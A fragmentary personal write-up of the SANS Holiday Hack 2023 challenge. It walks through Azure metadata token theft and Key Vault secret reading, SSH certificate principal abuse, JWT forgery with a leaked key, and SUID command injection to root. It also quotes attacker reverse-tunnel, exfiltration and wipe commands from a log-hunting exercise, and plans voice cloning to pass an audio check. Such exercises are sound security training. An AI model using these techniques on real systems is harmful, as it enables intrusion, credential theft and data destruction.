As is tradition, I started the SANS Holiday Hack and this time I almost did
everything.

Previous years' writeups:
[/categories/holiday-hack/]({{< relref "/categories/holiday-hack/" >}}).

You have to run a few commands to find the trolls.

```
ls
cat troll_19315479765589239
rm troll_19315479765589239
pwd
ls -alt
cat .bash_history
printenv
cd workshop
grep -ir "troll"
chmod +x present_engine 
./present_engine 
cd /home/elf/workshop/electrical
mv blown_fuse0 fuse0
ln -s fuse0 fuse1
cp fuse1 fuse2
echo "TROLL_REPELLENT" > fuse2
cd /opt/troll_den
find . -iname "*troll*"
find . -group troll
find . -size +108k -size -110k
ps -aux
netstat -napt
curl localhost:54321 # wget was not on the system
kill -9 6224 # process' pid
```

Might be able to use it in solo mode (by tinkerting client-side variables).

`gameType = "solo"` changes the snowball color but it was not right. The options
were `co-op` and `free-for-all`.

```
elfThrowDelay # 2000

playersHitBoxSize # maybe we can change it to all zeros
(4)Â [30, 30, 40, 60]

santaHitBoxSize = [200,200,200,200]
playersHitBoxSize = [1,1,1,1]

singlePlayer # change to true? - it's a string
'false'

santaThrowDelay # change it to higher
500

window.location.href

'https://hhc23-snowball.holidayhackchallenge.com/room/?username=parsiya&roomId=190d57f7f&roomType=private&gameType=co-op&id=...&dna=...&singlePlayer=false'

# the URL has gameType "co-op" and singlePlayer=false
# what if we changed it to gameType=solo and singlePlayer=true
# gameType=solo is wrong. I can only see `free-for-all` and `co-op` in code.

# the ball color changes and the page reloads but no enemies show up
# maybe we have to modify roomType
```

All the variables are set in the page's JavaScript.

`gameType=co-op&singlePlayer=true`

makes "elf the dwarf" join the game. This is probably what `elfThrowDelay` means

https://hhc23-snowball.holidayhackchallenge.com/room/?username=parsiya&roomId=891de62b&roomType=private&gameType=co-op&id=...&dna=...&singlePlayer=true

We have to wait a bit for the game to start.
And then kill Santa.

----------

Had to go and talk to Santa again. I missed it because he would start from
scratch. He said to go to a different place but doesn't tell you where.

I had to go right for a moderate amount of time to get to Rudloph's Rest. Seems
like Santa doesn't send you there. You have to use the bottom-left minimap to
navigate the waters.

Just go through them and figure out which ones are LLM hallucinations. These are
usually big errors. For example, `HTTP SEND`, `HTTP 7.4.33`, port `88555/TCP`.

One of the hints after finishing the challenge is this URL (it's supposedly
interesting). It shows a web portal where we can paste an SSH public key and get
an SSH certificate.

https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl

Also a link and hint to Azure REST APIs if cli is not available:
https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token


# Certificate SSHenanigans

Function App: https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl

Pixel Island is in the top right. We go there and see `Rainmaster Cliffs`.

Important notes:

* Use the `monitor` account.
* Create a certificate and upload the public key to the portal so you can use it to SSH?
* Where does Azure REST APIs come into play?

```json
// generate a key
ssh-keygen -C "monitor" -f monitor

// we will get two files monitor and monitor.pub

// use the public key to get a signed cert

{
    "ssh_cert": "rsa-sha2-512-cert-v01@openssh.com [removed]",
    "principal": "elf"
}

// rename the old public key
mv monitor.pub monitor.old

// use the signed cert from the server as the new public key, paste it in monitor.pub

// login as monitor - note we're passing the private key here
ssh monitor@ssh-server-vm.santaworkshopgeeseislands.org -i monitor
```

We will see a `Satellite Tracking Interface`. Press `ctrl+c` to go into a CLI.
It's run via `~/.bashrc`.

```
# Start SatTrackr
/usr/local/bin/sattrackr
```

This is where we have to use curl and get info through the Azure REST API.
 
We need a token that we can get using this
https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token

GET 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' HTTP/1.1 Metadata: true

Shouldn't change the resource.

```json
$ curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"\
    -H "Metadata: true"

{
  "access_token": "[removed]",
  "client_id": "b84e06d3-aba1-4bcc-9626-2e0d76cba2ce",
  "expires_in": "85606",
  "expires_on": "1702417629",
  "ext_expires_in": "86399",
  "not_before": "1702330929",
  "resource": "https://management.azure.com/",
  "token_type": "Bearer"
}
```

We have an access token. We can pass it in curl to get the code for the app.
Instead of passing it every time, we put it in a curl config file like this:

```bash
# cfg
-H "Authorization: bearer [token from above]"
```

Then pass the config file with `--config cfg`.

----------

**Use the Function App to get his TODO list.**

This is to get the source code. We need to figure out the placeholders.

GET https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Web/sites/{name}/sourcecontrols/web?api-version=2022-03-01

https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl

Now we need three placeholders:

* `name` is probably `northpole-ssh-certs-fa`
* `subscriptionId`: TBD.
* `resourceGroupName`: TBD.

GET https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Web/sites/{name}/sourcecontrols/web?api-version=2022-03-01

## Red Herring - GitHub Repo
I went through a red herring and got the source code for the SSH app
(`northpole-ssh-certs-fa`)

```json
curl "https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web?api-version=2022-03-01"
    --config cfg

{
  // removed
  "properties": {
    "repoUrl": "https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa",
    // removed
  }
}
```

Let's go here which is available publicly:
https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa

There is no TODO list here. We need to list all the function apps here and find
the TODO app's name to get its source code.

## Red Herring 2 - Login as Alabaster
I saw that `alabaster` is the 2nd user on the machine. I tried to create a cert
for `alabaster` and login and it didn't work. We can only login as `monitor`.

Then I looked at the source code of the application and saw we can have a 2nd
JSON key named `principal`.

```py
def parse_input(data) -> Tuple[PublicKey, str]:
    """Parse and validate input parameters."""
    # removed

    principal = data.get("principal", DEFAULT_PRINCIPAL)
    # removed
    principal = principal.strip()
    # removed
    try:
        return PublicKey.from_string(ssh_pub_key), principal
    except ValueError as err:
        raise ValidationError("ssh_pub_key is not a valid SSH public key.") from err
```

It's used in `create_cert` which is done with a POST request.

```py
@app.route(route="create-cert", methods=['GET', 'POST'])
def create_cert(req: func.HttpRequest) -> func.HttpResponse:
    """Create SSH certificate."""
    # removed
    ssh_pub_key, principal = parse_input(req.get_json())

    cert_fields = CertificateFields(
        serial=1,
        key_id=str(uuid.uuid4()),
        valid_after=datetime.utcnow() - timedelta(minutes=5),
        valid_before=datetime.utcnow() + timedelta(days=28),
        principals=[principal],
        critical_options=[],
        extensions=[
            "permit-pty"
        ]
    )

    # removed
    ssh_cert = SSHCertificate.create(
        subject_pubkey=ssh_pub_key,
        ca_privkey=ca_ssh_priv_key,
        fields=cert_fields,
    )

    ssh_cert.sign()
    logging.info("SSH signed certificate: %s", ssh_cert.to_string())

    return func.HttpResponse(
        json.dumps({"ssh_cert": ssh_cert.to_string(), "principal": principal}),
        mimetype="application/json",
        status_code=200
    )
    #  removed
```

So I created a new key pair for `alabaster`. Opened the DevTools and signed it
normally. Then right-click and copy as cURL command and then modified the
payload.

So the new payload was:

```json
{
    "ssh_pub_key": "ssh-rsa [removed] alabaster",
    "principal": "alabaster"
}
```

And it didn't work. Mainly because I had not realized `principal` and `username`
are different. So I had to login as monitor and look at the sshd configuration
to figure out what principal is used server-side.

It's in `/etc/ssh/auth_principals` and we have two files there:

```
$ ls /etc/ssh/auth_principals/
alabaster  monitor`
$ cat monitor
elf
$ cat alabaster
admin
```

So we need to use the principal `admin`.

```json
{
    "ssh_pub_key": "ssh-rsa [removed] alabaster",
    "principal": "admin"
}
```

```json
$ curl 'https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl' \
  -H 'authority: northpole-ssh-certs-fa.azurewebsites.net' \
  -H 'accept: */*' \
  -H 'content-type: application/json' \
  -H 'origin: https://northpole-ssh-certs-fa.azurewebsites.net' \
  -H 'referer: https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl' \
  --data-raw '{"ssh_pub_key":"ssh-rsa [token] alabaster","principal":"admin"}' \
  --compressed
```

The result had this:

```json
{
    "ssh_cert": "rsa-sha2-512-cert-v01@openssh.com [removed] ",
    "principal": "admin"
}
```

Now, we can login as `alabaster`.

```
ssh alabaster@ssh-server-vm.santaworkshopgeeseislands.org -i alabaster

$ ls
alabaster_todo.md  impacket

$ cat alabaster_todo.md
# Geese Islands IT & Security Todo List

[removed the rest of the list]

- [ ] Gingerbread Cookie Cache: Implement a gingerbread cookie caching mechanism
  to speed up data retrieval times. Don't let Santa eat the cache!
```

The answer is `Gingerbread`.

Unlock the mysteries of JWTs with insights from
[PortSwigger's JWT Guide](https://portswigger.net/web-security/jwt).

Elves are too fast to hit, probably something in the cookies/headers/JWT.

The original request has a cookie named `ElfHunt_JWT` (I am just gonna put the
decoded values here).

```json
{"alg":"none","typ":"JWT"}
{"speed": -500}
```

The override must happen on `main.js` which is the file that decodes the JWT and
sets up the game. So we can just [modify the cookie value][c-c] in Chrome at
`Applications > Storage > Cookies > https://elfhunt.org` to
`eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzcGVlZCI6MH0.`.

[c-c]: https://developer.chrome.com/docs/devtools/application/cookies

Changing to `{"speed":0}` and reloading the page. This makes nothing happen. We
have to something low like `{"speed":-50}` (+10 didn't work either, maybe it
makes them fly the other way?).

So I changed the speed to `-50`, reload the page and click the game again.
Scored 75 points and it showed me a diary page.

According to Piney, his comms office is somewhere else. It might come in handy
there.

The only important thing is the name of the admin role:
`GeeseIslandsSuperChiefCommunicationsOfficer`.

Login back to the account. We see `impacket`. But where do we start?

We have to get a different token to talk to AD.

```
// Get the token:
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.net' \
    -H Metadata:true > nem.txt

// Put it in the cURL config file like we saw before.
curl "https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01" \

Not useful. Let's get a token for `vault.azure.net`.

```
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net' \
    -H Metadata:true > cfg3

curl -K cfg3 "https://northpole-ssh-certs-kv.vault.azure.net/secrets?api-version=7.4"

// no access
```

Let's try a different API call.

```json
curl -K cfg3 "https://northpole-it-kv.vault.azure.net/secrets?api-version=7.4"

{
  "value": [
    {
      "id": "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript",
      "attributes": {
        "enabled": true,
        "created": 1699564823,
        "updated": 1699564823,
        "recoveryLevel": "Recoverable+Purgeable",
        "recoverableDays": 90
      },
      "tags": {}
    }
  ],
  "nextLink": null
}
```

Cool, get the secret.

```json
curl -K cfg3 "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript/?api-version=7.4" | jq

{
  "value": "Import-Module ActiveDirectory; $UserName = \"elfy\"; $UserDomain = \"northpole.local\"; $UserUPN = \"$UserName@$UserDomain\"; $Password = ConvertTo-SecureString \"J4`ufC49/J4766\" -AsPlainText -Force; $DCIP = \"10.0.0.53\"; New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName -Surname \"\" -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru",
  "id": "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript/ec4db66008024699b19df44f5272248d",
  "attributes": {
    "enabled": true,
    "created": 1699564823,
    "updated": 1699564823,
    "recoveryLevel": "Recoverable+Purgeable",
    "recoverableDays": 90
  },
  "tags": {}
}
```

After unescaping with Cyberchef:

```powershell
Import-Module ActiveDirectory
$UserName = "elfy"
$UserDomain = "northpole.local"
$UserUPN = "$UserName@$UserDomain"
$Password = ConvertTo-SecureString "J4`ufC49/J4766" -AsPlainText -Force
$DCIP = "10.0.0.53"
New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName
    -Surname "" -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru
```

Now we have the domain controller's IP, username and password.

How do we find file shares?

```
// this should be run with a token for management

curl "https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01" \
    -K cfg-management 

{"value":[]}
```

Nothing, maybe we should try and see what's at `northpole.local`.

Now I remember that we have access to impacket so can use it to enumerate all
accessible shares.

```
smbclient.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'

# password has a / so we need to wrap it in single quotes.

We can see the `wombleycube` user belongs to `NORTHPOLE\wombleycube` which is
not `researchers`, but they were mentioned in the hint. We cannot find any users
for the `researchers` group anyways so I guess we can concentrate on that.

Different way to get the users:

One of the previous challenge hints talked about how AD can have the same
certificate issues. One tool that was mentioned in the Reportinator challenge
was `certipy` which is in included in this machine.

12 certificate templates are active. These three look promising:

`Administrator`, `User`, `NorthPoleUsers`.

Can we get an admin user or should we just get one for `wombleycube` because
none of the users are admin.

Next we must request a certificate for the `wombleycube` user like this:

```
$ certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User
Certipy v4.0.0 - by Oliver Lyak (ly4k)

```

I got an error because I awas passing `npdc01.northpole.local` to target, I
should have used the actual IP.

We cannot enroll as admin

```

Google doc from the video author: https://docs.google.com/document/d/1QhKZLDr22G0RpuTSGm0M6pz4dG82IByesim3elwfw98/edit

Removed my notes here because I found https://samy.pl/master/master.html.

I tried a few times and nothing worked. I even dumped the numbers with
`console.log(lock_numbers)` and trying them didn't work either.

So I cheated. Put a breakpoint on `if (stage == 3 && !isTweenActive) {`. Change
`stage` to `3` and I was done.

Good luck, matey! I've no doubts about your cleverness in cracking this conundrum!

Send a message with a new `go-time` that is four hours earlier than what was
planned.

Four roles:

* `radioUser`: Initial jwt. Cannot do anything.
* `radioMonitor`: `jwDefault/rMonitor.tok` to view data.
* `radioDecoder`: To decode signals.
* Admin which is `GeeseIslandsSuperChiefCommunicationsOfficer`.

The system uses JWT authorization bearer tokens.

The main page sets two cookies:

```json
// justWatchThisRole

// header
{
  "alg": "RS256",
  "typ": "JWT"
}

// payload
{
  "iss": "HHC 2023 Captain's Comms",
  "iat": 1699485795.3403327,
  "exp": 1809937395.3403327,
  "aud": "Holiday Hack 2023",
  "role": "radioUser"
}

// signature
```

And `CaptainsCookie` which appears to be malformed

```json
// header
{"captainsVictory":0,"userid":"1107f7a8-1eef-4a38-b8f8-7335c94bc9c6"}

// payload
e}$1

// signature
00000000  8f 95 89 dd aa 16 86 67 c6 b5 ab 7b 9a 5f 20 b2  |...ÃÂª..gÃÂµÂ«{._ Â²|
00000010  ed 80 80 0a                                      |Ã­...|
```

Our first task is figure out how to change the role to `radioMonitor`.

https://captainscomms.com/checkRole uses the `justWatchThisRole` cookie as an
"Authorization: Bearer" token.

`X-Request-Item` header has the requested resource:

* `waterfall`: decoder.
* `tx`: transmitter.

`https://captainscomms.com/jwtDefault` is also inaccesible even with the initial
JWT.

With the default token, we get this

```json
// header
{"alg":"RS256","typ":"JWT"}

// payload
{
  "iss": "HHC 2023 Captain's Comms",
  "iat": 1699485795.3403327,
  "exp": 1809937395.3403327,
  "aud": "Holiday Hack 2023",
  "role": "radioMonitor"
}
```

So I guess we can use this token to access the laptop monitor. The checkrole is
called when I click on the signals so I edited the value of the
`justWatchThisRole` in the browser.

We can click on the signals to decode them. None are accessible with our current
token.

The value of `X-Request-Item` for them are (from left to right).

* `dcdCW`: Has morse code and we saw it in the journal.
* `dcdNUM`:
* `dcdFX`:

We need to have the `radioDecoder` role to access them.

The notes mention that captain's public key is in the same directory as the
`radioMonitor` token. Using the authorization header we see it at
https://captainscomms.com/jwtDefault/keys/capsPubKey.key:

```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsJZuLJVB4EftUOQN1Auw
VzJyr1Ma4xFo6EsEzrkprnQcdgwz2iMM76IEiH8FlgKZG1U0RU4N3suI24NJsb5w

qZ5ssa4Rah9sWnm0CKG638/lVD9kwbvcO2lMlUeTp7vwOTXEGyadpB0WsuIKuPH6
uQIDAQAB
-----END PUBLIC KEY-----
```

Let's try doing an `"alg":"none"` attack and change our role to `radioDecoder`.
Most likely will not work. And it didn't work.

If we see the public key, the challenge might want us to do a "sign with
public key" attack to modify the role to `radioDecoder`.

Signing with empty key like this didn't work.

```json
{
    "kid": "../../../../../../dev/null",
    "typ": "JWT",
    "alg": "HS256"
}
```

Signing the key with the public key didn't work either.

The trick was trying to download https://captainscomms.com/jwtDefault/rDecoder.tok
with the `radioMonitor` token. Which gave me the `radioDecoder` token.

```json
// payload
{
  "iss": "HHC 2023 Captain's Comms",
  "iat": 1699485795.3403327,
  "exp": 1809937395.3403327,
  "aud": "Holiday Hack 2023",
  "role": "radioDecoder"
}
```

Now when clicking on the signals to decode, I get these in response:
`dcdCW.mp4`, `dcdNUM.mp4`, `dcdFX.mp4`.

Burp was hiding the image files in the history (because that's how I usually set
up the filters). The actual files are in paths like this
`https://captainscomms.com/static/images/dcdCW.mp4`. It was not working in the
Burp browser so I had to use cURL. Interestingly, the other two files didn't
need the JWT and I could just download them.

All 3 are video files:

```
// dcdCW.mp4
SILLY CAPTAIN! WE FOUND HIS FANCY RADIO PRIVATE KEY IN A FOLDER CALLED TH3CAPSPR1V4T3F0LD3R.

// dcdFX.mp4
Image of the islands. The center one has a bubble that says "Freq: 10426 Hz".

// dcdNUM.mp4
{music} {music} {music}
88323 88323 88323
{gong} {gong} {gong} {gong} {gong} {gong}
12249 12249 16009 16009 12249 12249 16009 16009
{gong} {gong} {gong} {gong} {gong} {gong}
{music} {music} {music}
```

We need to figure out the name of the private key.

Clues: `TH3CAPSPR1V4T3F0LD3R` and `/jwtDefault/keys/capsPubKey.key`.

Key is in `https://captainscomms.com/jwtDefault/keys/TH3CAPSPR1V4T3F0LD3R/capsPrivKey.key`

We can forge a JWT for the admin role. The admin role is
`GeeseIslandsSuperChiefCommunicationsOfficer`. And we can use the transmitter.

We need a `frequency`, `go-date` and `go-time`.

We already know the frequency: `10426`.

We have to decode the number station message to figure out the `go-date` and
`go-time` of the original message and then respond with a time four hours
earlier.

Usually the first part of the message in the number station (`88323` here) is
the ID of the intended recipient. We can discard it here.

Looking at the rest of the numbers. They all end in 9

```
12249 12249 16009 16009 12249 12249 16009 16009

// if we remove it, we get 1224 1600 which are the date and time.

// we need to send 4 hours earlier so
1224 1200
```

**And that solved the challenge.**

```

```

SUID executables appear to be what we should be looking for.

```
$ find / -perm -u=s -type f 2>/dev/null

/usr/bin/chsh
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/bin/simplecopy
```

The last binary is the one we should be exploiting because it's very new.

```
$ ls -alt /usr/bin
total 35800
-rwsr-xr-x 1 root root     16952 Dec  2 22:17  simplecopy
# removed

$ /usr/bin/simplecopy --help
Usage: ./simplecopy <source> <destination>
```

We can easily copy out `/etc/passwd` and change our permissions to be able to
run as root. However, what about the "crafty argument"?

Both arguments are vulnerable to command injection. However, first argument's
injection will use the rest as input. So `/usr/bin/simplecopy nem1;ls nem2` will
run `ls nem2`.

Seems like I cannot do spaces in the commands unless I split it between the
arguments. E.g., this doesn't work because `ls -alt` is counted as one command.

```
`/usr/bin/simplecopy nem2;'ls -alt' /root
Usage: /usr/bin/simplecopy <source> <destination>
bash: ls -alt: command not found`
```

This should work but doesn't?!

```
$ /usr/bin/simplecopy nem2;ls /root  
Usage: /usr/bin/simplecopy <source> <destination>
ls: cannot open directory '/root': Permission denied
```

For some reason I cannot see inside `/root`. Although the permissions are set.

```bash
$ /usr/bin/simplecopy nem2;'ls' -alt 
Usage: /usr/bin/simplecopy <source> <destination>
# removed
drwx------   1 root root 4096 Dec  2 22:17 root
```

I am still `elf`?

```
$ /usr/bin/simplecopy nem2;'whoami' 
Usage: /usr/bin/simplecopy <source> <destination>
elf
```

Looks like it's just piping the input to `cp` so `cp src dst`. So this copies
`/root` to `/home/elf`: `/usr/bin/simplecopy '-r /root' '/home/elf/'` but the
permissions are not changed.

After relogging to the machine, it worked. With `whoami` I can see I am root. So
now I can see inside the `/root` directory.

```
$ /usr/bin/simplecopy '--ss' ';ls /root'
cp: unrecognized option '--ss'
Try 'cp --help' for more information.
runmetoanswer

$ /usr/bin/simplecopy '--ss' ';/root/runmetoanswer'
cp: unrecognized option '--ss'
Try 'cp --help' for more information.
Who delivers Christmas presents?

```

Now I need to answer the question. `Santa` is not the correct answer.
Answer was actually `santa`. We could also see the help for this binary with

```
$ /usr/bin/simplecopy '--ss' ';/root/runmetoanswer --help'
cp: unrecognized option '--ss'
Try 'cp --help' for more information.
D'aww, people hardly ever ask me for help! Nice to meet you!

The usage is really easy, we promise! Just pass your answer as a commandline argument, like:

    ./runtoanswer MyWonderfulAnswer

Or just run ./runtoanswer by itself, and it'll ask for your answer!

Bye now!

Which employee has the IP address: '10.10.0.19'?

```sql
Employees 
| where ip_addr == "10.10.0.19"

Candy Cane Sugarplum
```

How many emails did Santa Claus receive?

```sql
Email
| where recipient =~ "santa_claus@santaworkshopgeeseislands.org"
| summarize count() by recipient

// the solution uses "count" like this

Email
| where recipient =~ 'santa_claus@santaworkshopgeeseislands.org'
| count

19
```

`summarize dcount(sender)` or `distinct sender`.

`OutboundNetworkEvents` table contains websites browsed by employees.
User name is not recorded, but each user has one assigned IP address in the
`Employees` table.

The 3rd question in the training is wrong. It asks "How many unique websites did
Rudolph Rednose visit?". There's no employee by that name in the `Employees`
table.

The solution uses the IP for "Rudolph Wreathington" (only employee with Rudolph
in their name) and the answer from that solution is not accepted.

KQL Cheatsheet: https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/kql-quick-reference

## Onboarding
**How many Craftperson Elf's are working from laptops?**

The `Employees` table has a column `hostname`. Laptop users' machines end in
`LAPTOP` like `RZLS-LAPTOP`.

My initial mistake was not looking at the roles. Not every employee has the
`Craftperson Elf` role.

```sql
Employees
| where role has "craftsperson" and hostname has "laptop"
| summarize dcount(hostname)

25
```

## Case 1
The alert says the user clicked the malicious link
`http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx`.

```sql
Email
| where link == "http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx"
```

**What is the email address of the employee who received this phishing email?**
`alabaster_snowball@santaworkshopgeeseislands.org`

**What is the email address that was used to send this spear phishing email?**  
`cwombley@gmail.com`

**What was the subject line used in the spear phishing email?**
`[EXTERNAL] Invoice foir reindeer food past due`

## Case 2

```sql
Employees
| where email_addr == "alabaster_snowball@santaworkshopgeeseislands.org"
```

**What is the role of our victim in the organization?**
`Head Elf`

**What is the hostname of the victim's machine?**
`Y1US-DESKTOP`

**What is the source IP linked to the victim?**
`10.10.0.4`

## Case 3

```sql
OutboundNetworkEvents
| where url == "http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx"
```

**What time did Alabaster click on the malicious link? Make sure to copy the exact timestamp from the logs!**
`2023-12-02T10:12:42Z`

**What file is dropped to Alabaster's machine shortly after he downloads the malicious file?**
Assuming "shortly" here is an hour. We can use `between`. Note how I had to pass
the time stamp text to `datetime`.

```sql
FileCreationEvents
| where hostname == "Y1US-DESKTOP" and timestamp between(datetime(2023-12-02T10:12:42Z) .. datetime(2023-12-02T11:12:42Z))
```

We see two results, the first is the docx, and the second is the answer:
`C:\ProgramData\Windows\Jolly\giftwrap.exe`.

## Case 4
Analyzing what `giftwrap.exe` did.

**The attacker created an reverse tunnel connection with the compromised machine. What IP was the connection forwarded to?**
I couldn't find any data with `process_name` or `parent_process_name` set
to `giftwrap`. So I just listed all the events for that machine and then looked
at the events near the timestamp after download file event in the previous
answer.

```sql
ProcessEvents
| where hostname == "Y1US-DESKTOP"

# found this command
"ligolo" --bind 0.0.0.0:1251 --forward 127.0.0.1:3389 --to 113.37.9.17:22 --username rednose --password falalalala --no-antispoof
```

`113.37.9.17`

**What is the timestamp when the attackers enumerated network shares on the machine?**
The command is `net share`.

```sql
ProcessEvents

**What was the hostname of the system the attacker moved laterally to?**

So we need to look for `net use`

```sql
ProcessEvents
| where hostname == "Y1US-DESKTOP" and process_commandline has "net use"

// result
cmd.exe /C net use \\NorthPolefileshare\c$ /user:admin AdminPass123
```

`NorthPolefileshare`

## Case 5
Commands might be base64 encoded.

`extend` adds a column to the result table.

```sql
Employees 
| where name == "Santa Claus" 
| extend Base64Name=base64_encode_tostring(name)
```

`base64_decode_tostring` does decoding.

**When was the attacker's first base64 encoded PowerShell command executed on Alabaster's machine?**
Let's see which commands on the machine had the string `powershell`.

```sql
ProcessEvents
| where hostname == "Y1US-DESKTOP" and process_commandline has "powershell"
```

First result is actually wrong.

We're looking for the 2nd which happend in `2023-12-24T16:07:47Z`

**What was the name of the file the attacker copied from the fileshare? (This might require some additional decoding)**
`NaughtyNiceList.txt`

The 2nd command with a base64 payload decodes into this:

```powershell
( 'txt.tsiLeciNythguaN\potkseD\:C txt.tsiLeciNythguaN\lacitirCnoissiM\$c\erahselifeloPhtroN\\
    metI-ypoC c- exe.llehsrewop' -split '' | %{$_[0]}) -join ''

// after reverse
powershell.exe -c Copy-Item
    \\NorthPolefileshare\c$\MissionCritical\NaughtyNiceList.txt
    C:\Desktop\NaughtyNiceList.txt
```

**The attacker has likely exfiltrated data from the file share. What domain name was the data exfiltrated to?**
`giftbox.com`

Another payload after base64 decode decodes into:

```powershell
[StRiNg]::JoIn( '', [ChaR[]]([removed]))|& ((gv '*MDr*').NamE[3,11,2]-joiN

# According to ChatGPT
Download-File C:\Desktop\NaughtyNiceList.docx \\giftbox.com\file

# It's actually wrong, the correct answer is
downwithsanta.exe -exfil C:\\Desktop\\NaughtNiceList.docx \\giftbox.com\file
```

## Case 6
We know that the attackers stole Santa's naughty or nice list. What else
happened? Can you find the final malicious command the attacker ran?

The final base64 encoded command is
`C:\Windows\System32\downwithsanta.exe --wipeall \\\\NorthPolefileshare\\c$`

**What is the name of the executable the attackers used in the final malicious command?**
`downwithsanta.exe`

**What was the command line flag used alongside this executable?**
`--wipeall`

## Final
To earn credit for your fantastic work, return to the Holiday Hack Challenge and
enter the secret phrase which is the result of running this query:
`print base64_decode_tostring('QmV3YXJlIHRoZSBDdWJlIHRoYXQgV29tYmxlcw==')`

Answer: `Beware the Cube that Wombles`.

# Space Island Door Access Speaker

> for more information.

The secret passphrase is from `Certificate SSHenanigans`.

```
# cat InstructionsForEnteringSatelliteGroundStation.txt
Note to self:

To enter the Satellite Ground Station (SGS), say the following into the speaker:

And he whispered, 'Now I shall be out of sight;
So through the valley and over the height.'
And he'll silently take his way.
```

We need to upload a wav file that says the passphrase (all of that text and not
just the quote) in Wombley's voice. We have his sound in the audiobook he gave
us so we need to find an AI that can do analyze it and make a file for us.

https://play.ht/ is in the first hint for this year's holiday hack.
